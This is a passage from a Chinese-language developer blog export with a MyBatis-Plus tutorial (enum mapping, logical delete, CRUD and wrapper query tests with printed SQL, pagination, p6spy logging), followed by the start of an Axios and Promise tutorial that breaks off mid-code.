mybatisPlusInterceptorVerion() { MybatisPlusInterceptor mybatisPlusInterceptor = new MybatisPlusInterceptor(); mybatisPlusInterceptor.addInnerInterceptor(new OptimisticLockerInnerInterceptor()); return mybatisPlusInterceptor; } } @通用枚举简介 有些字段在数据库中的存储为数字，但是希望返回给前端的是汉字，比如用户的性别在数据库中：sex=0 (0女 1男 2保密) 期望返回的是汉字不是数字 注意不能给实体类中的字段设置成 @TableField(select = false) 这样不会去查询，所以返回的都会是 null 如果需要赋值比如更新或者插入数据也可以通过枚举进行赋值 sysUser.setSex(SexEnums.女); @Test void save(){ SysUser sysUser = new SysUser(); sysUser.setSex(SexEnums.女); mapper.insert(sysUser); } 方式一：通过注解实现 数据库中有个 sex 字段，类型为 int，默认值为 2 创建枚举类 SexEnums 属性上加上 @EnumValue 注解 点击显/隐代码块 package com.adalucky.MybatisPlus.common.enums.mysql; import com.baomidou.mybatisplus.annotation.EnumValue; /** * @ClassName SexEnums * @Description 数据库枚举,当数据库中的 sex =1 我们映射为男，sex=2,映射为女 * @Author ada * @Computer Mac mini * @Date 2022/3/7 16:56 * @JDKVersion JDK1.8 */ public enum SexEnums { // code=1时候映射成 sex1 ，变量要加 @EnumValue 注解 女(0,\"当 sex=0 映射成女\"),男(1,\"当 sex=2 映射成男\"), 保密(2,\"当 sex=2 映射成保密\"); SexEnums(Integer code,String msg){ this.code = code; this.msg = msg; } @EnumValue private final int code; private final String msg; } 配置 application.yml（com.adalucky.MybatisPlus.common.enums.mysql 为枚举类所在的目录） mybatis-plus: type-enums-package: com.adalucky.MybatisPlus.common.enums.mysql 实体类定义时类型为枚举类对应的类型 private SexEnums sex; 方式二：通过实现接口 配置 application.yml（com.adalucky.MybatisPlus.common.enums.mysql 为枚举类所在的目录）和上面是一致的 mybatis-plus: type-enums-package: com.adalucky.MybatisPlus.common.enums.mysql 实体类定义时类型为枚举类对应的类型 private StatusEnums status; 定义枚举类实现接口 点击显/隐代码块 package com.adalucky.MybatisPlus.common.enums.mysql; import com.baomidou.mybatisplus.annotation.IEnum; /** * @author ada * @ClassName StatusEnums * @Description Status 枚举 * @Computer Macbook pro * @Date 2022/3/7 21:37 * @JDKVersion JDK1.8 */ public enum StatusEnums implements IEnum&lt;Integer&gt; { 启用(0, \"当 status=0 映射成启用\"), 禁用(1, \"当 status=1 映射成禁用\"); private final Integer code; private final String msg; StatusEnums(Integer code, String msg) { this.code = code; this.msg = msg; } @Override public Integer getValue() { return this.code; } } 逻辑删除 Mybatis-Plus推荐使用 3.3.0及以上版本就不需要在实体中对该字段添加@TableLogic注解 查询时会过滤掉逻辑删除的数据，删除时只会逻辑删除，修改 deleted 的值 配置 application.yml文件 mybatis-plus: type-enums-package: com.adalucky.MybatisPlus.common.enums global-config: db-config: #全局配置，主键自动增长，就不需要在每个实体类上声明了 @TableId(type = IdType.AUTO) id-type: auto logic-delete-field: deleted # 全局逻辑删除的实体字段名(since 3.3.0版本以上就不需要在实体中对该字段添加@TableLogic注解) logic-delete-value: 0 # 逻辑已删除值(默认为 1.我们改为 0) logic-not-delete-value: 1 # 逻辑未删除值(默认为 0，我们改为 1) entity 实体类主要是绑定数据库的 类上指定表名：Mybatis-Plus 默认会用我们的实体类的类名作为数据库表名查询（默认是开启了支持类名和数据之间的驼峰和蛇形命名的转换，如果需要关闭需要去 yml 中配置），如果表名和类名对不上就在类层面加上这个注解可以绑定类和数据库的表，@TableName(\"sys_user\") 指定主键：Mybatis-Plus 默认会将 字段名叫做 id 的当做主键，如果主键字段名不叫 id，可以在对应的字段定义出加上@TableId(type = IdType.AUTO) 申明是一个主键,并且开启自增，type=IdType.AUTO 就是声明主键生成策略，是一个枚举，还有什么雪花算法之类的，我们一般是用自增。不写的话就为 NONE Key 描述 AUTO 数据库自增，如果开发者自己赋值后数据库依旧会采用自增策略覆盖掉 NONE 无。采用默认的 Mybatis-Plus set 主键，雪花算法实现 INPUT 需要开发者手动赋值（如果开发者没有赋值，传递参数会为 null，但是数据库主键有自己的策略进行自增） ASSIGN_ID Mybatis-Plus自动分配 ID，Long、Integer、String 也是一个雪花算法 ASSIGN_UUID Mybatis-Plus自动分配UUID，String 注意生成的类型为 String 那么声明的实体也需要是 String 其次数据库的类型也要是字符支持的类型，长度 指定字段名：@TableField(\"nickname\") 或者 @TableField(value=\"nickname\") 当字段和数据库字段命名不一致时可以进行绑定 其它表中的字段：@TableField(exist = false) 声明该实体不是表内的字段 指定忽略查询字段: @TableField(select = false) 更多注解参考 官方注解指南 mapper mapper 里面的方法都是以 select update insert delete 命名的，很严谨，因为是直接和数据库交互的 service里面都是 get 什么之类的 mapper 是对实体类操作，最终把操作映射到数据库里面，mapper 是一个接口集成 baseMapper，指定泛型为需要操作的实体类对象 需要用@Component注入到 IOC 中 BaseMapper 中有 17个(版本不同可能不一样多)已经封装好的增删改查的方法可以直接用 SysUserMapper 去调用 SysUserMapper 也是一个接口 但是是动态代理的，丢到虚拟机中，启动运行了以后就会生成该对象 @Component public interface SysUserMapper extends BaseMapper&lt;SysUser&gt; { } insertinsert insert 插入单条数据 /** * insert 插入单条数据 * 返回的是一个 int 类型，成功条数 * 主键设置了自增策略可以不赋值，其它的字段没有做不为空要求 * Execute SQL：INSERT INTO sys_user ( login_name, user_name, sex, status, create_time ) VALUES ( '13512648422', '测试save456', 2, 1, '2022-03-08T17:14:52.816' ) */ @Test void insert() { SysUser sysUser = new SysUser(); sysUser.setLoginName(\"13512648422\"); sysUser.setUserName(\"测试save456\"); sysUser.setSex(SexEnums.SECRET); sysUser.setStatus(StatusEnums.ENABLE); mapper.insert(sysUser); } Wapper简介 Wapper 就是一个条件构造，我们可以去自定义一些条件查询，上面的查询基本上都是针对主键来的 单条件 wrapper.eq /** * wrapper.eq 单条件查询 * 根据user_name 查询值为【阿达】的数据，user_name字段名必须和数据字段名一致 * 数据中的字段叫做 user_name 这里可以写成 user_name 或者 user_Name 不支持 userName 会提示找不到列名 * Execute SQL：SELECT user_id,dept_id,login_name,user_name,user_type,email,phonenumber,sex,avatar,status,deleted,project_id,login_ip,login_date,version FROM sys_user WHERE deleted='1' AND (user_name = '阿达') */ @Test void selectWrapperEq(){ QueryWrapper wrapper = new QueryWrapper(); wrapper.eq(\"user_name\", \"阿达\"); System.out.println(mapper.selectList(wrapper)); } 多条件 wrapper.allEq /** * wrapper.allEq 多条件查询 * 查询 user_name=阿达 并且 status=1，并且sex=1 的数据 * Execute SQL：SELECT user_id,dept_id,login_name,user_name,user_type,email,phonenumber,sex,avatar,status,deleted,project_id,login_ip,login_date,version FROM sys_user WHERE deleted='1' AND (user_name = '阿达' AND sex = 1 AND status = 1) */ @Test void selectWrapperAllEq(){ QueryWrapper wrapper = new QueryWrapper(); Map map = new HashMap(); map.put(\"user_name\", \"阿达\"); map.put(\"status\", 1); map.put(\"sex\", 1); wrapper.allEq(map); System.out.println(mapper.selectList(wrapper)); } 小于 wrapper.lt /** * wrapper.lt 小于 * 查询 user_id 小于 10005 的数据（不包含等于） * Execute SQL：SELECT user_id,dept_id,login_name,user_name,user_type,email,phonenumber,sex,avatar,status,deleted,project_id,login_ip,login_date,version FROM sys_user WHERE deleted='1' AND (user_id &lt; 10005) */ @Test void selectWrapperLt() { QueryWrapper wrapper = new QueryWrapper(); wrapper.lt(\"user_id\", 10005); System.out.println(mapper.selectList(wrapper)); } 大于 wrapper.gt 大于 /** * wrapper.gt 大于 * 查询 user_id 大于 10005 的数据（不包含等于） * Execute SQL：SELECT user_id,dept_id,login_name,user_name,user_type,email,phonenumber,sex,avatar,status,deleted,project_id,login_ip,login_date,version FROM sys_user WHERE deleted='1' AND (user_id &gt; 10005) */ @Test void selectWrapperGt() { QueryWrapper wrapper = new QueryWrapper(); wrapper.gt(\"user_id\", 10005); System.out.println(mapper.selectList(wrapper)); } 大于等于 wrapper.ge 大于等于 /** * wrapper.ge 大于等于 * 查询 user_id 大于等于 10005 的数据（包含等于） * Execute SQL：SELECT user_id,dept_id,login_name,user_name,user_type,email,phonenumber,sex,avatar,status,deleted,project_id,login_ip,login_date,version FROM sys_user WHERE deleted='1' AND (user_id &gt;= 10005) */ @Test void selectWrapperGe() { QueryWrapper wrapper = new QueryWrapper(); wrapper.ge(\"user_id\", 10005); System.out.println(mapper.selectList(wrapper)); } 不等于 wrapper.ne 不等于 /** * wrapper.ne 不等于 * 查询 user_name 不等于 【阿达】的数据 * Execute SQL：SELECT user_id,dept_id,login_name,user_name,user_type,email,phonenumber,sex,avatar,status,deleted,project_id,login_ip,login_date,version FROM sys_user WHERE deleted='1' AND (user_name &lt;&gt; '阿达') */ @Test void selectWrapperNt(){ QueryWrapper wrapper = new QueryWrapper(); wrapper.ne(\"user_name\", \"阿达\"); System.out.println(mapper.selectList(wrapper)); } 模糊查询 wrapper.like 模糊查询 /** * wrapper.like 模糊查询 * 查询 user_name 中包含了【测试】的数据 * Execute SQL：SELECT user_id,dept_id,login_name,user_name,user_type,email,phonenumber,sex,avatar,status,deleted,project_id,login_ip,login_date,version FROM sys_user WHERE deleted='1' AND (user_name LIKE '%测试%') */ @Test void selectWrapperLike() { QueryWrapper wrapper = new QueryWrapper(); wrapper.like(\"user_name\", \"测试\"); System.out.println(mapper.selectList(wrapper)); } 左模糊查询 wrapper.like 左模糊查询 /** * wrapper.like 左模糊查询 * 查询 user_name 中以【测试】结尾的数据 * Execute SQL：SELECT user_id,dept_id,login_name,user_name,user_type,email,phonenumber,sex,avatar,status,deleted,project_id,login_ip,login_date,version FROM sys_user WHERE deleted='1' AND (user_name LIKE '%测试') */ @Test void selectWrapperLikeLeft() { QueryWrapper wrapper = new QueryWrapper(); wrapper.likeLeft(\"user_name\", \"测试\"); System.out.println(mapper.selectList(wrapper)); } 右模糊查询 wrapper.likeRight 右模糊查询 /** * wrapper.likeRight 右模糊查询 * 查询 user_name 中以【测试】开头的数据 * Execute SQL：SELECT user_id,dept_id,login_name,user_name,user_type,email,phonenumber,sex,avatar,status,deleted,project_id,login_ip,login_date,version FROM sys_user WHERE deleted='1' AND (user_name LIKE '测试%') */ @Test void selectWrapperLikeRight() { QueryWrapper wrapper = new QueryWrapper(); wrapper.likeRight(\"user_name\", \"测试\"); System.out.println(mapper.selectList(wrapper)); } 联合查询 wrapper.inSql 联合查询 /** * wrapper.inSql 联合查询 * 查询 user_id &gt; 10004,status = 1 * Execute SQL：SELECT user_id,dept_id,login_name,user_name,user_type,email,phonenumber,sex,avatar,status,deleted,project_id,login_ip,login_date,version FROM sys_user WHERE deleted='1' AND (user_id IN (select user_id from sys_user where user_id &gt; 10004) AND status IN (select status from sys_user where status = 1)) */ @Test void selectWrapperInsql() { QueryWrapper wrapper = new QueryWrapper(); wrapper.inSql(\"user_id\", \"select user_id from sys_user where user_id &gt; 10004\"); wrapper.inSql(\"status\", \"select status from sys_user where status = 1\"); System.out.println(mapper.selectList(wrapper)); } 升序 wrapper.orderByAsc 升序排列 /** * wrapper.orderByAsc 升序排列 * 查询数据并根据 user_id 升序排列 * Execute SQL：SELECT user_id,dept_id,login_name,user_name,user_type,email,phonenumber,sex,avatar,status,deleted,project_id,login_ip,login_date,version FROM sys_user WHERE deleted='1' ORDER BY user_id ASC */ @Test void selectWrapperOrderByAsc() { QueryWrapper wrapper = new QueryWrapper(); wrapper.orderByAsc(\"user_id\"); mapper.selectList(wrapper).forEach(System.out::println); } 降序 wrapper.orderByDesc 降序排列 /** * wrapper.orderByDesc 降序排列 * 查询数据并根据 user_id 降序排列 * Execute SQL：SELECT user_id,dept_id,login_name,user_name,user_type,email,phonenumber,sex,avatar,status,deleted,project_id,login_ip,login_date,version FROM sys_user WHERE deleted='1' ORDER BY user_id DESC */ @Test void selectWrapperOrderByDesc() { QueryWrapper wrapper = new QueryWrapper(); wrapper.orderByDesc(\"user_id\"); mapper.selectList(wrapper).forEach(System.out::println); } 降序+过滤 wrapper.orderByDesc 降序排列 wrapper.having 排序后过滤 /** * wrapper.orderByDesc 降序排列 * wrapper.having 排序后过滤 * 查询数据并根据 user_id 降序排列，只保留 status = 1 的数据（StatusEnums.启用 枚举中映射的为 1） * Execute SQL：SELECT user_id,dept_id,login_name,user_name,user_type,email,phonenumber,sex,avatar,status,deleted,project_id,login_ip,login_date,version FROM sys_user WHERE deleted='1' HAVING status ORDER BY user_id DESC */ @Test void selectWrapperOrderByDescAndHaving() { QueryWrapper wrapper = new QueryWrapper(); wrapper.orderByDesc(\"user_id\"); wrapper.having(\"status\", StatusEnums.启用); mapper.selectList(wrapper).forEach(System.out::println); } selectselectList selectList 查询数据 本次为没有条件，查询所有的并遍历打印 @SpringBootTest class SysUserMapperTest { @Autowired SysUserMapper mapper; /** * selectList 查询数据 * 返回一个 List&lt;T&gt; 查询结果对象集合 * Execute SQL：SELECT user_id,dept_id,login_name,user_name,user_type,email,phonenumber,sex,avatar,status,deleted,project_id,login_ip,login_date,version FROM sys_user WHERE deleted='1' */ @Test void selectList() { //queryWrapper 条件构造器，没有条件就用 null mapper.selectList(null).forEach(System.out::println); } } selectById selectById 根据主键查询 /** * selectById 根据主键查询 * 返回一个实体对象 * Execute SQL：SELECT user_id,dept_id,login_name,user_name,user_type,email,phonenumber,sex,avatar,status,deleted,project_id,login_ip,login_date,version FROM sys_user WHERE user_id=10021 AND deleted='1' */ @Test void selectById(){ SysUser sysUser = mapper.selectById(10021); System.out.println(sysUser); } selectBatchIds mapper.selectBatchIds 主键查询多个值 /** * mapper.selectBatchIds 主键查询多个值 * 查询主键中等于 【10001, 10002, 10005】的数据 * Execute SQL：SELECT user_id,dept_id,login_name,user_name,user_type,email,phonenumber,sex,avatar,status,deleted,project_id,login_ip,login_date,version FROM sys_user WHERE user_id IN ( 10001 , 10002 , 10005 ) AND deleted='1' */ @Test void selectBatchIds() { mapper.selectBatchIds(Arrays.asList(10001, 10002, 10005)).forEach(System.out::println); } selectByMap mapper.selectByMap 根据 map 对象查询 Map 只能做等值判断，逻辑判断需要使用 Wrapper /** * mapper.selectByMap 根据 map 对象查询 * 查询 user_id = 10003的数据 * Map 只能做等值判断，逻辑判断需要使用 Wrapper * Execute SQL：SELECT user_id,dept_id,login_name,user_name,user_type,email,phonenumber,sex,avatar,status,deleted,project_id,login_ip,login_date,version FROM sys_user WHERE user_id = 10003 AND deleted='1' */ @Test void selectbyMap() { Map&lt;String, Object&gt; map = new HashMap&lt;&gt;(); map.put(\"user_id\", 10003); mapper.selectByMap(map).forEach(System.out::println); } selectMaps selectMaps 返回wrapper的结果集 /** * selectMaps 返回wrapper的结果集 * selectMaps 返回的是一个结果集，selectList 返回的是对象列表 * Execute SQL：SELECT user_id,dept_id,login_name,user_name,user_type,email,phonenumber,sex,avatar,status,deleted,project_id,login_ip,login_date,version FROM sys_user WHERE deleted='1' AND (user_id = 10001) */ @Test void selectMaps() { QueryWrapper wrapper = new QueryWrapper(); wrapper.eq(\"user_id\", 10001); mapper.selectMaps(wrapper).forEach(System.out::println); } 分页查询配置 需要先注入分页的 bean，然后才能使用分页查询 package com.adalucky.MybatisPlus.config; import com.baomidou.mybatisplus.annotation.DbType; import com.baomidou.mybatisplus.extension.plugins.MybatisPlusInterceptor; import com.baomidou.mybatisplus.extension.plugins.inner.OptimisticLockerInnerInterceptor; import com.baomidou.mybatisplus.extension.plugins.inner.PaginationInnerInterceptor; import org.springframework.context.annotation.Bean; import org.springframework.context.annotation.Configuration; /** * @ClassName MyBatisPlusConfig * @Description MyBatis-Plus 配置类 * @Author ada * @Computer Mac mini * @Date 2022/1/28 18:25 * @JDKVersion JDK1.8 */ @Configuration public class MyBatisPlusConfig { // 最新版 分页插件 DbType.MYSQL 指定为自己的方言 @Bean public MybatisPlusInterceptor mybatisPlusInterceptorPage() { MybatisPlusInterceptor interceptor = new MybatisPlusInterceptor(); interceptor.addInnerInterceptor(new PaginationInnerInterceptor(DbType.MYSQL)); return interceptor; } } selectPage selectPage 分页查询，返回的结果集是一个对象 /** * selectPage 分页查询，返回的结果集是一个对象 * getSize() 每页的大小和参数 size 一样 * getTotal() 统计查询的总条数 * getRecords() 分页后的结果列表 * Execute SQL：SELECT user_id,dept_id,login_name,user_name,user_type,email,phonenumber,sex,avatar,status,deleted,project_id,login_ip,login_date,version FROM sys_user WHERE deleted='1' LIMIT 5,5 */ @Test void selectPage(){ IPage&lt;SysUser&gt; ipage = new Page&lt;&gt;(2,5); IPage&lt;SysUser&gt; result = mapper.selectPage(ipage, null); System.out.println(result.getSize()); System.out.println(result.getTotal()); result.getRecords().forEach(System.out::println); } selectMapsPage selectMapsPage 分页查询，返回的结果集是一个 map /** * selectMapsPage 分页查询，返回的结果集是一个 map * Execute SQL：SELECT user_id,dept_id,login_name,user_name,user_type,email,phonenumber,sex,avatar,status,deleted,project_id,login_ip,login_date,version FROM sys_user WHERE deleted='1' LIMIT 5,5 */ @Test void selectMapsPage() { IPage&lt;Map&lt;String, Object&gt;&gt; ipage = new Page&lt;&gt;(2,5); IPage&lt;Map&lt;String, Object&gt;&gt; mapIPage = mapper.selectMapsPage(ipage, null); mapIPage.getRecords().forEach(System.out::println); } selectObjs selectObjs() 查询主键的集合，返回的是所有主键的列表 /** * selectObjs() 查询主键的集合，返回的是所有主键的列表 * Execute SQL：SELECT user_id,dept_id,login_name,user_name,user_type,email,phonenumber,sex,avatar,status,deleted,project_id,login_ip,login_date,version FROM sys_user WHERE deleted='1' */ @Test void selectObjs(){ List&lt;Object&gt; objects = mapper.selectObjs(null); objects.forEach(System.out::println); } selectOne selectOne() 要求返回的结果中只能有一条数据 /** * selectOne() 要求返回的结果中只能有一条数据 * 需要通过 wrapper 构造一个唯一结果 * Execute SQL：SELECT user_id,dept_id,login_name,user_name,user_type,email,phonenumber,sex,avatar,status,deleted,project_id,login_ip,login_date,version FROM sys_user WHERE deleted='1' AND (user_id = 10003) */ @Test void selectOne() { QueryWrapper wrapper = new QueryWrapper(); wrapper.eq(\"user_id\", 10003); SysUser sysUser = mapper.selectOne(wrapper); System.out.println(sysUser); } deletedeleteById deleteById 根据主键删除 /** * deleteById 根据主键删除 * 根据主键 id 删除，因为配了逻辑删除，这里只会修改删除标识，不会物理删除 * Execute SQL：UPDATE sys_user SET deleted='0' WHERE user_id=100 AND deleted='1' */ @Test void deleteById() { mapper.deleteById(100); } deleteBatchIds deleteBatchIds 删除 ID 集合的数据 /** * deleteBatchIds 删除 ID 集合的数据 * 传入的是一个主键的集合，多个 id，返回的结果集是一个 int 类型，删除成功了几条 * Execute SQL：UPDATE sys_user SET deleted='0' WHERE user_id IN ( 10001 , 10002 , 10003 ) AND deleted='1' */ @Test void deleteBatchIds(){ int i = mapper.deleteBatchIds(Arrays.asList(10001, 10002, 10003)); System.out.println(i); } delete deleted 删除数据（如果没有条件就是删除所有的） /** * deleted 删除数据 * 传递的参数是一个 wrapper 条件构造器（如果没有条件就是删除所有的） * Execute SQL：UPDATE sys_user SET deleted='0' WHERE deleted='1' AND (user_name = '测试4') */ @Test void deleted() { QueryWrapper wrapper = new QueryWrapper(); wrapper.eq(\"user_name\", \"测试4\"); int delete = mapper.delete(wrapper); System.out.println(delete); } deleteByMap deleteByMap 删除 Map 中的等值数据 /** * deleteByMap 删除 Map 中的等值数据 * 做的等值判断，如下示例就是判断数据库中 user_id=10006 的数据，返回的是一个 int 类型删除成功的行数 * Execute SQL：UPDATE sys_user SET deleted='0' WHERE user_id = 10006 AND deleted='1' */ @Test void deleteByMap(){ Map&lt;String, Object&gt; map = new HashMap&lt;&gt;(); map.put(\"user_id\", 10006); int i = mapper.deleteByMap(map); System.out.println(i); } updateupdateById updateById 根据主键 ID 去更新数据 /** * updateById 根据主键 ID 去更新数据 * 这里是先查了一个数据出来，然后 set 替换值后再把这个对象去替换 * Execute SQL：SELECT user_id,dept_id,login_name,user_name,user_type,email,phonenumber,sex,avatar,status,deleted,project_id,login_ip,login_date,version FROM sys_user WHERE user_id=10021 AND deleted='1' * Execute SQL：UPDATE sys_user SET dept_id=105, login_name='13512648422', user_name='update更新', user_type='00', email='', phonenumber='', sex=2, avatar='', status=1, login_ip='', update_time='2022-03-08T16:48:32.042', version=3 WHERE user_id=10021 AND version=2 AND deleted='1' */ @Test void updateById(){ SysUser sysUser = mapper.selectById(10021); sysUser.setUserName(\"update更新\"); mapper.updateById(sysUser); } update update 更新满足条件的数据 /** * update 更新满足条件的数据 * 参数为一个实体对象，一个条件构造器 * 本示例为更新 10021 这个数据的名称为 update 同时该数据的 status需要为启用状态才会更新 * Execute SQL：SELECT user_id,dept_id,login_name,user_name,user_type,email,phonenumber,sex,avatar,status,deleted,project_id,login_ip,login_date,version FROM sys_user WHERE user_id=10021 AND deleted='1' * Execute SQL：UPDATE sys_user SET dept_id=105, login_name='13512648422', user_name='update', user_type='00', email='', phonenumber='', sex=2, avatar='', status=1, login_ip='', update_time='2022-03-08T17:05:47.010', version=5 WHERE deleted='1' AND (status = 0 AND version = 4) */ @Test void update() { SysUser sysUser = mapper.selectById(10021); sysUser.setUserName(\"update\"); QueryWrapper wrapper = new QueryWrapper(); wrapper.eq(\"status\", StatusEnums.ENABLE); int update = mapper.update(sysUser, wrapper); System.out.println(update); } 自定义 SQL多表关联查询 需求：用户有自己的属性 姓名 账户 所属部门，所属公司 我们需要通过关联查询出某一个用户的部门和个人信息账号等 说明：这里只用了两张表，和4 个字段，多张表和多个字段实现方法一样，注意 VO 中的成员属性需要和数据库中的字段名一致，如果不一致需要在 sql 语句中给查询的字段起别名保持和 VO 中的一致，不然无法对应会为 null VO: view object 数据库返回给视图的叫做(返回给页面展示的) VO DTO：Data Transfer Object 业务层传输给数据库的叫做（前端传递的参数） DTO SELECT u.login_name,u.user_id,u.user_name,d.dept_name FROM sys_dept d,sys_user u WHERE u.dept_id=d.dept_id and u.user_id=10003 新建一个 VO 实体，该实体定义接收的数据字段 @Data public class UserVO { private Integer userId; private String loginName; private String userName; private String deptName; } Mapper 中自己实现方法（自带的方法已经满足不了我们的需求了） 方法命名建议也采用 select _ By _ 的方式（service 中用 get） 通过注解 Select 把 sql 放进去，sql 的参数用 #{ 参数 } 引用 这里面的参数应该是按照顺序取的，第一个#{}对应着方法中的第一个参数，第二个对应着方法中的第二个参数 方法中返回的是 List&lt;VO&gt; 对象，传递的参数就是上面 sql 引用的参数 @Component public interface SysUserMapper extends BaseMapper&lt;SysUser&gt; { /** * * @param user_id 用户表的 id 主键 * @param status 是否禁用标识，用的枚举类 * @return 查询结果列表封装到 UserVO 中 */ //@Select(\"SELECT u.login_name,u.user_id,u.user_name,d.dept_name FROM sys_dept d,sys_user u WHERE u.dept_id=d.dept_id and u.user_id=#{user_id}\") @Select(\"SELECT u.login_name,u.user_id,u.user_name,d.dept_name FROM sys_dept d,sys_user u WHERE u.dept_id=d.dept_id AND u.user_id=#{user_id} AND u.status=#{status}\") List&lt;UserVO&gt; selectUserVoById(Integer user_id, StatusEnums status); } 调用 selectUserVoById /** * selectUserVoById 自定义 sql * 需要传递两个参数，一个是用户ID，一个是启用状态（这里直接用的枚举中的） * Execute SQL：SELECT u.login_name,u.user_id,u.user_name,d.dept_name FROM sys_dept d,sys_user u WHERE u.dept_id=d.dept_id AND u.user_id=10003 AND u.status=1 */ @Test void selectUserVoById(){ List&lt;UserVO&gt; userVOS = mapper.selectUserVoById(10003, StatusEnums.ENABLE); userVOS.forEach(System.out::println); } SQL日志打印 在执行程序的时候如果需要查看执行的 sql 语句我们可以通过配置打印出来 mybatis-plus实现类输出 通过配置 yml 文件中的 mybatis-plus进行配置输出日志 mybatis-plus: configuration: #打印mybatis-plus的 sql 执行语句 log-impl: org.apache.ibatis.logging.stdout.StdOutImpl debug输出 正式环境推荐使用该方式，以 debug 模式显示出执行的 sql 语句和参数 p6spy实现 建议在单元测试中、或者本地调试使用，因为会消耗性能，不建议部署在线上环境 添加 p6spy 依赖 &lt;!--执行 SQL 分析打印,yml配置中需要修改数据的连接驱动为 driver-class-name: com.p6spy.engine.spy.P6SpyDriver url 改成 jdbc:p6spy:mysql://127.xxx --&gt; &lt;dependency&gt; &lt;groupId&gt;p6spy&lt;/groupId&gt; &lt;artifactId&gt;p6spy&lt;/artifactId&gt; &lt;version&gt;3.9.1&lt;/version&gt; &lt;/dependency&gt; 修改数据库驱动为：com.p6spy.engine.spy.P6SpyDriver url 修改为：jdbc:p6spy:mysql://127.xxx spring: datasource: driver-class-name: com.p6spy.engine.spy.P6SpyDriver url: jdbc:p6spy:mysql://127.0.0.1:3306/data_auto_endpoint?useUnicode=true&amp;characterEncoding=UTF-8&amp;serverTimezone=GMT%2B8 username: root password: 123456 resources 下新增 spy.properties （是在resources 下的根目录新增 不能在 config 中新增，文件名也不要写错了） #modulelist=com.p6spy.engine.logging.P6LogFactory,com.p6spy.engine.outage.P6OutageFactory modulelist=com.baomidou.mybatisplus.extension.p6spy.MybatisPlusLogFactory,com.p6spy.engine.outage.P6OutageFactory # logMessageFormat自定义日志打印格式如下 # Consume Time：48 ms 2022-03-07 15:14:51 # Execute SQL： 执行的 sql 语句 logMessageFormat=com.baomidou.mybatisplus.extension.p6spy.P6SpyLogger # 使用日志系统记录sql appender=com.baomidou.mybatisplus.extension.p6spy.StdoutLogger # 设置使用p6spy driver来做代理 deregisterdrivers=true # JDBC URL 是否加上前缀，设置为 true，会加上 p6spy: 作为前缀。取值 true| false useprefix=true ## 配置记录Log例外 error,info,batch,debug,statement,commit,rollback,result,resultset. excludecategories=info,debug,result,commit,resultset # 日期格式 dateformat=yyyy-MM-dd HH:mm:ss # 是否开启慢SQL记录 outagedetection=true # 慢SQL记录标准 秒 outagedetectioninterval=2","categories":[{"name":"Auto","slug":"Auto","permalink":"https://www.adalucky.com/categories/Auto/"}],"tags":[{"name":"Mybatis-Plus","slug":"Mybatis-Plus","permalink":"https://www.adalucky.com/tags/Mybatis-Plus/"}],"author":"Ada"},{"title":"Axios","slug":"Auto/axios","date":"2022-02-26T14:21:00.000Z","updated":"2022-06-13T14:43:37.102Z","comments":true,"path":"/auto/axios/","link":"","permalink":"https://www.adalucky.com/auto/axios/","excerpt":"Axios，是一个基于promise网络请求库，作用于node.js和浏览器中，它是 isomorphic 的(即同一套代码可以运行在浏览器和node.js中)。在服务端它使用原生node.js http模块, 而在客户端 (浏览端) 则使用XMLHttpRequests","text":"Axios，是一个基于promise网络请求库，作用于node.js和浏览器中，它是 isomorphic 的(即同一套代码可以运行在浏览器和node.js中)。在服务端它使用原生node.js http模块, 而在客户端 (浏览端) 则使用XMLHttpRequests 参考资料 认识 axios Axios简单的理解就是ajax的封装 Axios 是一个基于 promise 的 HTTP 库 支持node端和浏览器端 使用Promise管理异步，告别传统callback方式 丰富的配置项，支持拦截器等高级配置 转换请求数据和响应数据 接口案例 项目的两种编程方式：模板式编程（服务端渲染好的模板返回，例如 jsp）、接口式编程（现在基本都是这种，前后端分离） RestFul API 规范（URL，HTTP， 版本， 状态码， 返回值， 请求条件等规范） GET（SELECT）：从服务器取出资源（一项或多项）。 POST（CREATE）：在服务器新建一个资源。 PUT（UPDATE）：在服务器更新资源（客户端提供改变后的完整资源）。（更新表内一行的所有数据） PATCH（UPDATE）：在服务器更新资源（客户端提供改变的属性）。（更新表内一行数据的一部分字段） DELETE（DELETE）：从服务器删除资源。 我们配置接口时，这只是一种规范，只是建议大家按照规范来使用而已。 Promise简介 主要用于异步计算 可以将异步操作队列化，按照期望的顺序执行，返回符合预期的结果 可以在对象之间传递和操作promise，帮助我们处理队列 异步回调的问题： 之前处理异步是通过纯粹的回调函数的形式进行处理 很容易进入到回调地狱中，剥夺了函数return的能力 问题可以解决，但是难以读懂，维护困难 稍有不慎就会踏入回调地狱 - 嵌套层次深，不好维护 promise promise是一个对象，对象和函数的区别就是对象可以保存状态，函数不可以（闭包除外） 并未剥夺函数return的能力，因此无需层层传递callback，进行回调获取数据 代码风格，容易理解，便于维护 多个异步等待合并便于解决 状态 Promise总共有三种状态：pending reslove reject pending就是未决，resolve可以理解为成功，reject可以理解为拒绝 pending 可能会转变为 resolve pending 也可能会转变为 reject then() 函数回调后如果函数中没有发生错误会返回一个 resolve 状态的 Promise，如果回调中发生错误会返回一个 reject 状态的 Promise 然后触发 catch 的函数，同理如果 catch 中的执行没有发生错误依旧也会返回一个 resolve 状态的 Promise，还是可以走后面的 then 回调 回调地狱 回调地狱简单说就是 套娃 请求A，但是A又依赖于B，因此在请求的A里面包含着B，同时B又依赖着C，因此B里面又包含着C，C又包含着D 这种模式就称为回调地狱 用法异步 任何一个 then 中如果发生错误会走 catch 的回调，这里没有定义 每增加一个回调就按照这种格式写比前面的更加清晰 同步 Promise.all 传递的参数是一个数组 多个任务完成后才会触发下一个回调 多个任务返回的也是一个数组 axios简介 axios 发起请求后返回的就是一个 Promise 对象，所以要先掌握 Promise 接口是本地 mock 的一些，主要看效果 示例一 html 中通过 srcipt 引入 axios 方式进行测试 点击显/隐代码块 &lt;!DOCTYPE html&gt; &lt;html lang=\"en\"&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Title&lt;/title&gt; &lt;script src=\"https://cdn.bootcdn.net/ajax/libs/axios/0.26.0/axios.min.js\"&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;script&gt; //第一种用法，默认请求方式为 get axios(\"http://127.0.0.1:4523/mock/673120/getUser?id=1&amp;author=ada\") .then(res =&gt; console.log(res.data)) //第二种用法 method 不传的话默认为 get axios({ method: \"get\", url: \"http://127.0.0.1:4523/mock/673120/getUser\", params: {id: 1, author: \"ada\"} }) .then(res =&gt; console.log(res.data)) //第三种 POST 可自己设置 headers axios({ method: \"POST\", url: \"http://127.0.0.1:4523/mock/673120/getInfo\", headers: { \"content-type\": \"application/json\" }, data: { cid: 10000, region: \"mock\" } }) .then(res =&gt; 